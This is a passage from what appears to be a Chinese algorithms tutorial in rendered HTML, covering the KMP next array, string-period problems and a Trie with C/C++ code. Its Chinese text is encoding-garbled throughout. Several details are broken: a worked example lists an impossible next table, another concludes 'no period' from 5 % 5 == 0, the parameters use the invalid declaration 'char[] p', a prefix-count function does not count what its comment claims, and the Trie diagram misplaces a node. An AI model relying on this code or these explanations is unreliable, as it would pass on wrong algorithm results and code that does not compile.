1</code>ï¼Œè¡¨ç¤ºå‰ç¼€å’Œåç¼€ <code>a</code> åŒ¹é…ã€‚</li></ul></li><li><code>i = 7</code>ï¼Œå­—ç¬¦ <code>s[7] = &#39;b&#39;</code>ï¼š<ul><li><code>s[2] = &#39;b&#39;</code> å’Œ <code>s[7] = &#39;b&#39;</code> åŒ¹é…ï¼Œæ‰€ä»¥ <code>ne[7] = 2</code>ï¼Œè¡¨ç¤ºå‰ç¼€å’Œåç¼€ <code>ab</code> åŒ¹é…ã€‚</li></ul></li></ul></li></ol><p><code>ne</code> æ•°ç»„çš„å«ä¹‰</p><ul><li><code>ne[1] = 0</code>ï¼Œè¡¨ç¤ºä» <code>s[1]</code> æ²¡æœ‰ä»»ä½•å‰åç¼€åŒ¹é…ã€‚</li><li><code>ne[2] = 0</code>ï¼Œè¡¨ç¤ºä» <code>s[1..2]</code> æ²¡æœ‰ä»»ä½•å‰åç¼€åŒ¹é…ã€‚</li><li><code>ne[3] = 1</code>ï¼Œè¡¨ç¤ºä» <code>s[1..3]</code> æœ‰ä¸€ä¸ªåŒ¹é…çš„å‰åç¼€ï¼š<code>a</code>ã€‚</li><li><code>ne[4] = 2</code>ï¼Œè¡¨ç¤ºä» <code>s[1..4]</code> æœ‰ä¸€ä¸ªåŒ¹é…çš„å‰åç¼€ï¼š<code>ab</code>ã€‚</li><li><code>ne[5] = 0</code>ï¼Œè¡¨ç¤ºä» <code>s[1..5]</code> æ²¡æœ‰ä»»ä½•å‰åç¼€åŒ¹é…ã€‚</li><li><code>ne[6] = 1</code>ï¼Œè¡¨ç¤ºä» <code>s[1..6]</code> æœ‰ä¸€ä¸ªåŒ¹é…çš„å‰åç¼€ï¼š<code>a</code>ã€‚</li><li><code>ne[7] = 2</code>ï¼Œè¡¨ç¤ºä» <code>s[1..7]</code> æœ‰ä¸€ä¸ªåŒ¹é…çš„å‰åç¼€ï¼š<code>ab</code>ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000</span>;<br><span class="hljs-type">int</span> ne[N];  <span class="hljs-comment">// éƒ¨åˆ†åŒ¹é…è¡¨</span><br><br><span class="hljs-comment">// è®¡ç®—éƒ¨åˆ†åŒ¹é…è¡¨</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">getNext</span><span class="hljs-params">(<span class="hljs-type">char</span>* p, <span class="hljs-type">int</span> m)</span> &#123;<br>    ne[<span class="hljs-number">0</span>] = <span class="hljs-number">-1</span>;  <span class="hljs-comment">// åˆå§‹åŒ– ne[0]</span><br>    <span class="hljs-type">int</span> j = <span class="hljs-number">-1</span>;  <span class="hljs-comment">// j ä»£è¡¨å½“å‰åŒ¹é…çš„å­—ç¬¦ä½ç½®</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">while</span> (j &gt;= <span class="hljs-number">0</span> &amp;&amp; p[i] != p[j + <span class="hljs-number">1</span>]) j = ne[j];  <span class="hljs-comment">// å›é€€</span><br>        <span class="hljs-keyword">if</span> (p[i] == p[j + <span class="hljs-number">1</span>]) j++;  <span class="hljs-comment">// åŒ¹é…æˆåŠŸï¼Œæ‰©å±•</span><br>        ne[i] = j;  <span class="hljs-comment">// è®°å½•éƒ¨åˆ†åŒ¹é…å€¼</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// KMP ç®—æ³•åŒ¹é…å‡½æ•°</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">KMP</span><span class="hljs-params">(<span class="hljs-type">char</span>* s, <span class="hljs-type">char</span>* p)</span> &#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-built_in">strlen</span>(s), m = <span class="hljs-built_in">strlen</span>(p);<br>    getNext(p, m);  <span class="hljs-comment">// è®¡ç®—éƒ¨åˆ†åŒ¹é…è¡¨</span><br>    <span class="hljs-type">int</span> j = <span class="hljs-number">-1</span>;  <span class="hljs-comment">// æ¨¡å¼ä¸²åŒ¹é…çš„ä½ç½®</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;  <span class="hljs-comment">// ä» s[0] å¼€å§‹éå†</span><br>        <span class="hljs-keyword">while</span> (j &gt;= <span class="hljs-number">0</span> &amp;&amp; s[i] != p[j + <span class="hljs-number">1</span>]) j = ne[j];  <span class="hljs-comment">// å¦‚æœå­—ç¬¦ä¸åŒ¹é…ï¼Œå›é€€</span><br>        <span class="hljs-keyword">if</span> (s[i] == p[j + <span class="hljs-number">1</span>]) j++;  <span class="hljs-comment">// åŒ¹é…æˆåŠŸï¼Œæ‰©å±•</span><br>        <span class="hljs-keyword">if</span> (j == m - <span class="hljs-number">1</span>) &#123;  <span class="hljs-comment">// åŒ¹é…æˆåŠŸ</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Pattern found at position %d\n&quot;</span>, i - m + <span class="hljs-number">2</span>);  <span class="hljs-comment">// è¾“å‡ºä½ç½®ï¼ˆä»1å¼€å§‹ï¼‰</span><br>            j = ne[j];  <span class="hljs-comment">// ä½¿ç”¨éƒ¨åˆ†åŒ¹é…è¡¨è°ƒæ•´ä½ç½®</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">1000</span>], p[<span class="hljs-number">1000</span>];  <span class="hljs-comment">// å®šä¹‰å­—ç¬¦æ•°ç»„å­˜å‚¨è¾“å…¥çš„å­—ç¬¦ä¸²</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);  <span class="hljs-comment">// è¾“å…¥ä¸»å­—ç¬¦ä¸²</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, p);  <span class="hljs-comment">// è¾“å…¥æ¨¡å¼ä¸²</span><br>    KMP(s, p);  <span class="hljs-comment">// è°ƒç”¨ KMP ç®—æ³•æŸ¥æ‰¾æ¨¡å¼ä¸²</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ä¾‹é¢˜-12"><a href="#ä¾‹é¢˜-12" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h4><h4 id="æ‰¾å‡ºå­—ç¬¦ä¸²çš„å‘¨æœŸ"><a href="#æ‰¾å‡ºå­—ç¬¦ä¸²çš„å‘¨æœŸ" class="headerlink" title="æ‰¾å‡ºå­—ç¬¦ä¸²çš„å‘¨æœŸ"></a>æ‰¾å‡ºå­—ç¬¦ä¸²çš„å‘¨æœŸ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*è¾“å…¥å­—ç¬¦ä¸²ï¼š&quot;ABCABCABC&quot;</span><br><span class="hljs-comment">è®¡ç®—éƒ¨åˆ†åŒ¹é…è¡¨ neï¼š</span><br><span class="hljs-comment">ne = [-1, 0, 1, 2, 3, 4, 5, 6, 7]</span><br><span class="hljs-comment">æœ€é•¿å‰åç¼€é•¿åº¦ï¼šL = ne[8] = 6</span><br><span class="hljs-comment">è®¡ç®—å‘¨æœŸï¼št = len - L = 9 - 6 = 3</span><br><span class="hljs-comment">åˆ¤æ–­ï¼š9 % 3 == 0ï¼Œæ‰€ä»¥å‘¨æœŸä¸º 3ï¼Œè¾“å‡º &quot;The period of the string is: 3&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">è¾“å…¥å­—ç¬¦ä¸²ï¼š&quot;ABCDE&quot;</span><br><span class="hljs-comment">è®¡ç®—éƒ¨åˆ†åŒ¹é…è¡¨ neï¼š</span><br><span class="hljs-comment">ne = [-1, 0, 0, 0, 0]</span><br><span class="hljs-comment">æœ€é•¿å‰åç¼€é•¿åº¦ï¼šL = ne[4] = 0</span><br><span class="hljs-comment">è®¡ç®—å‘¨æœŸï¼št = len - L = 5 - 0 = 5</span><br><span class="hljs-comment">åˆ¤æ–­ï¼š5 % 5 == 0ï¼Œæ‰€ä»¥å­—ç¬¦ä¸²æ²¡æœ‰å‘¨æœŸï¼Œè¾“å‡º &quot;The string does not have a period.&quot;ã€‚*/</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000</span>;<br><span class="hljs-type">int</span> ne[N];  <span class="hljs-comment">// éƒ¨åˆ†åŒ¹é…è¡¨</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getNext</span><span class="hljs-params">(<span class="hljs-type">char</span>[] p, <span class="hljs-type">int</span> m)</span> &#123;<br>    ne[<span class="hljs-number">0</span>] = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">int</span> j = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">while</span> (j &gt;= <span class="hljs-number">0</span> &amp;&amp; p[i] != p[j + <span class="hljs-number">1</span>]) &#123; <span class="hljs-comment">// æ¯”è¾ƒp[i]å’Œp[j+1]</span><br>            j = ne[j];<br>        &#125;<br>        <span class="hljs-keyword">if</span> (p[i] == p[j + <span class="hljs-number">1</span>]) &#123;<br>            j++;<br>        &#125;<br>        ne[i] = j;<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">KMP</span><span class="hljs-params">(<span class="hljs-type">char</span>[] s, <span class="hljs-type">int</span> n)</span> &#123;<br>    getNext(s, n);<br>    <span class="hljs-type">int</span> len = n;<br>    <span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The string is empty.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> L = ne[len - <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>; <span class="hljs-comment">// æœ€é•¿å…¬å…±å‰åç¼€é•¿åº¦</span><br>    <span class="hljs-type">int</span> t = len - L;<br>    <span class="hljs-keyword">if</span> (t != <span class="hljs-number">0</span> &amp;&amp; len % t == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The period of the string is: %d\n&quot;</span>, t);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The string does not have a period.\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">1000</span>];<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>    <span class="hljs-type">int</span> n = <span class="hljs-built_in">strlen</span>(s);<br>    KMP(s, n);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="å­—ç¬¦ä¸²çš„æœ€å°å‘¨æœŸé—®é¢˜"><a href="#å­—ç¬¦ä¸²çš„æœ€å°å‘¨æœŸé—®é¢˜" class="headerlink" title="å­—ç¬¦ä¸²çš„æœ€å°å‘¨æœŸé—®é¢˜"></a>å­—ç¬¦ä¸²çš„æœ€å°å‘¨æœŸé—®é¢˜</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000</span>;<br><span class="hljs-type">int</span> ne[N];  <span class="hljs-comment">// éƒ¨åˆ†åŒ¹é…è¡¨</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">getNext</span><span class="hljs-params">(<span class="hljs-type">char</span>[] p, <span class="hljs-type">int</span> m)</span> &#123;<br>    ne[<span class="hljs-number">0</span>] = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">int</span> j = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">while</span> (j &gt;= <span class="hljs-number">0</span> &amp;&amp; p[i] != p[j + <span class="hljs-number">1</span>]) &#123;<br>            j = ne[j];  <span class="hljs-comment">// å›é€€</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (p[i] == p[j + <span class="hljs-number">1</span>]) &#123;<br>            j++;<br>        &#125;<br>        ne[i] = j;<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">findMinPeriod</span><span class="hljs-params">(<span class="hljs-type">char</span>[] s, <span class="hljs-type">int</span> n)</span> &#123;<br>    getNext(s, n);<br>    <span class="hljs-type">int</span> len = n;<br>    <span class="hljs-type">int</span> L = ne[len - <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>;  <span class="hljs-comment">// æœ€é•¿å…¬å…±å‰åç¼€çš„é•¿åº¦</span><br>    <span class="hljs-type">int</span> t = len - L;  <span class="hljs-comment">// è®¡ç®—å‘¨æœŸçš„é•¿åº¦</span><br><br>    <span class="hljs-keyword">if</span> (t != <span class="hljs-number">0</span> &amp;&amp; len % t == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The period of the string is: %d\n&quot;</span>, t);  <span class="hljs-comment">// è¾“å‡ºæœ€å°å‘¨æœŸ</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The string does not have a period.\n&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">1000</span>];<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>    <span class="hljs-type">int</span> n = <span class="hljs-built_in">strlen</span>(s);<br>    findMinPeriod(s, n);  <span class="hljs-comment">// æŸ¥æ‰¾æœ€å°å‘¨æœŸ</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Trieå­—ç¬¦ä¸²"><a href="#Trieå­—ç¬¦ä¸²" class="headerlink" title="Trieå­—ç¬¦ä¸²"></a>Trieå­—ç¬¦ä¸²</h3><p>å‡è®¾æˆ‘ä»¬æ’å…¥ä»¥ä¸‹å­—ç¬¦ä¸²ï¼šapple app banana appl app</p><p><strong>æ’å…¥ â€œappleâ€</strong>:</p><p>Root -&gt; a -&gt; p -&gt; p -&gt; l -&gt; e (cnt: 1)</p><p><strong>æ’å…¥ â€œappâ€</strong>:</p><p>Root -&gt; a -&gt; p -&gt; p (cnt: 2)<br>                      -&gt; l -&gt; e (cnt: 1)</p><p><strong>æ’å…¥ â€œbananaâ€</strong>:</p><p>Root -&gt; a -&gt; p -&gt; p (cnt: 2)<br>                      -&gt; l -&gt; e (cnt: 1)<br>      -&gt; b -&gt; a -&gt; n -&gt; a -&gt; n -&gt; a (cnt: 1)</p><p><strong>æ’å…¥ â€œapplâ€</strong>:</p><p>Root -&gt; a -&gt; p -&gt; p (cnt: 2)<br>                      -&gt; l -&gt; e (cnt: 1)<br>                            -&gt; l (cnt: 1)<br>      -&gt; b -&gt; a -&gt; n -&gt; a -&gt; n -&gt; a (cnt: 1)</p><p><strong>æ’å…¥ â€œappâ€</strong>:</p><p>Root -&gt; a -&gt; p -&gt; p (cnt: 3)<br>                      -&gt; l -&gt; e (cnt: 1)<br>                            -&gt; l (cnt: 1)<br>      -&gt; b -&gt; a -&gt; n -&gt; a -&gt; n -&gt; a (cnt: 1)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1000</span>;<br><span class="hljs-type">int</span> son[N][<span class="hljs-number">26</span>], cnt[N], idx;  <span class="hljs-comment">// Trieæ ‘çš„ç»“æ„ï¼šå„¿å­èŠ‚ç‚¹æ•°ç»„ sonï¼Œå•è¯è®¡æ•°æ•°ç»„ cntï¼Œå½“å‰èŠ‚ç‚¹ç´¢å¼• idx</span><br><br><span class="hljs-comment">// æ’å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span><br>&#123;<br>    <span class="hljs-type">int</span> p = <span class="hljs-number">0</span>;  <span class="hljs-comment">// ä»æ ¹èŠ‚ç‚¹å¼€å§‹</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; str[i]; i++)<br>    &#123;<br>        <span class="hljs-type">int</span> u = str[i] - <span class="hljs-string">&#x27;a&#x27;</span>;  <span class="hljs-comment">// è½¬æ¢å­—ç¬¦ä¸ºå¯¹åº”çš„æ•°ç»„ç´¢å¼•</span><br>        <span class="hljs-keyword">if</span> (!son[p][u]) son[p][u] = ++idx;  <span class="hljs-comment">// å¦‚æœè¯¥å­èŠ‚ç‚¹ä¸å­˜åœ¨ï¼Œåˆ™æ–°å»ºèŠ‚ç‚¹</span><br>        p = son[p][u];  <span class="hljs-comment">// è·³åˆ°è¯¥å­èŠ‚ç‚¹</span><br>    &#125;<br>    cnt[p]++;  <span class="hljs-comment">// æ›´æ–°ä»¥è¯¥èŠ‚ç‚¹ç»“å°¾çš„å•è¯æ•°é‡</span><br>&#125;<br><br><span class="hljs-comment">// æŸ¥è¯¢å­—ç¬¦ä¸²å‡ºç°çš„æ¬¡æ•°</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">query</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span><br>&#123;<br>    <span class="hljs-type">int</span> p = <span class="hljs-number">0</span>;  <span class="hljs-comment">// ä»æ ¹èŠ‚ç‚¹å¼€å§‹</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; str[i]; i++)<br>    &#123;<br>        <span class="hljs-type">int</span> u = str[i] - <span class="hljs-string">&#x27;a&#x27;</span>;  <span class="hljs-comment">// è½¬æ¢å­—ç¬¦ä¸ºå¯¹åº”çš„æ•°ç»„ç´¢å¼•</span><br>        <span class="hljs-keyword">if</span> (!son[p][u]) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// å¦‚æœæ²¡æœ‰å¯¹åº”çš„å­èŠ‚ç‚¹ï¼Œè¯´æ˜è¯¥å­—ç¬¦ä¸²ä¸å­˜åœ¨</span><br>        p = son[p][u];  <span class="hljs-comment">// è·³åˆ°è¯¥å­èŠ‚ç‚¹</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> cnt[p];  <span class="hljs-comment">// è¿”å›ä»¥è¯¥èŠ‚ç‚¹ç»“å°¾çš„å•è¯æ•°é‡ï¼Œå³è¯¥å­—ç¬¦ä¸²çš„å‡ºç°æ¬¡æ•°</span><br>&#125;<br><br><span class="hljs-comment">// å‰ç¼€åŒ¹é…ï¼Œè¿”å›ä»¥ prefix ä¸ºå‰ç¼€çš„å•è¯æ•°é‡</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">prefixCount</span><span class="hljs-params">(<span class="hljs-type">char</span> *prefix)</span><br>&#123;<br>    <span class="hljs-type">int</span> p = <span class="hljs-number">0</span>;  <span class="hljs-comment">// ä»æ ¹èŠ‚ç‚¹å¼€å§‹</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; prefix[i]; i++)<br>    &#123;<br>        <span class="hljs-type">int</span> u = prefix[i] - <span class="hljs-string">&#x27;a&#x27;</span>;  <span class="hljs-comment">// è½¬æ¢å­—ç¬¦ä¸ºå¯¹åº”çš„æ•°ç»„ç´¢å¼•</span><br>        <span class="hljs-keyword">if</span> (!son[p][u]) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// å¦‚æœæ²¡æœ‰å¯¹åº”çš„å­èŠ‚ç‚¹ï¼Œè¯´æ˜æ²¡æœ‰è¿™ä¸ªå‰ç¼€</span><br>        p = son[p][u];  <span class="hljs-comment">// è·³åˆ°è¯¥å­èŠ‚ç‚¹</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> cnt[p];  <span class="hljs-comment">// è¿”å›è¯¥èŠ‚ç‚¹åŠå…¶å­æ ‘çš„å•è¯æ•°é‡</span><br>&#125;<br><br><span class="hljs-comment">// è‡ªåŠ¨è¡¥å…¨ï¼Œè¿”å›æ‰€æœ‰ä»¥ prefix ä¸ºå‰ç¼€çš„å•è¯</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">autoComplete</span><span class="hljs-params">(<span class="hljs-type">int</span> p, <span class="hljs-built_in">string</span> prefix)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (cnt[p] &gt; <span class="hljs-number">0</span>)  <span class="hljs-comment">// å¦‚æœè¿™ä¸ªèŠ‚ç‚¹ç»“å°¾æœ‰å•è¯</span><br>        <span class="hljs-built_in">cout</span> &lt;&lt; prefix &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++)  <span class="hljs-comment">// éå†æ‰€æœ‰å¯èƒ½çš„å­—æ¯</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (son[p][i])  <span class="hljs-comment">// å¦‚æœæœ‰å­èŠ‚ç‚¹</span><br>        &#123;<br>            autoComplete(son[p][i], prefix + <span class="hljs-type">char</span>(i + <span class="hljs-string">&#x27;a&#x27;</span>));  <span class="hljs-comment">// é€’å½’ç”Ÿæˆå•è¯</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">1000</span>];<br><br>    <span class="hljs-comment">// æ’å…¥ä¸€äº›å•è¯</span><br>    insert(<span class="hljs-string">&quot;apple&quot;</span>);<br>    insert(<span class="hljs-string">&quot;app&quot;</span>);<br>    insert(<span class="hljs-string">&quot;banana&quot;</span>);<br>    insert(<span class="hljs-string">&quot;bat&quot;</span>);<br>    insert(<span class="hljs-string">&quot;ball&quot;</span>);<br><br>    <span class="hljs-comment">// æŸ¥è¯¢å­—ç¬¦ä¸²å‡ºç°çš„æ¬¡æ•°</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;apple count: &quot;</span> &lt;&lt; query(<span class="hljs-string">&quot;apple&quot;</span>) &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// ç»“æœåº”è¯¥æ˜¯ 1</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;app count: &quot;</span> &lt;&lt; query(<span class="hljs-string">&quot;app&quot;</span>) &lt;&lt; <span class="hljs-built_in">endl</span>;      <span class="hljs-comment">// ç»“æœåº”è¯¥æ˜¯ 1</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;banana count: &quot;</span> &lt;&lt; query(<span class="hljs-string">&quot;banana&quot;</span>) &lt;&lt; <span 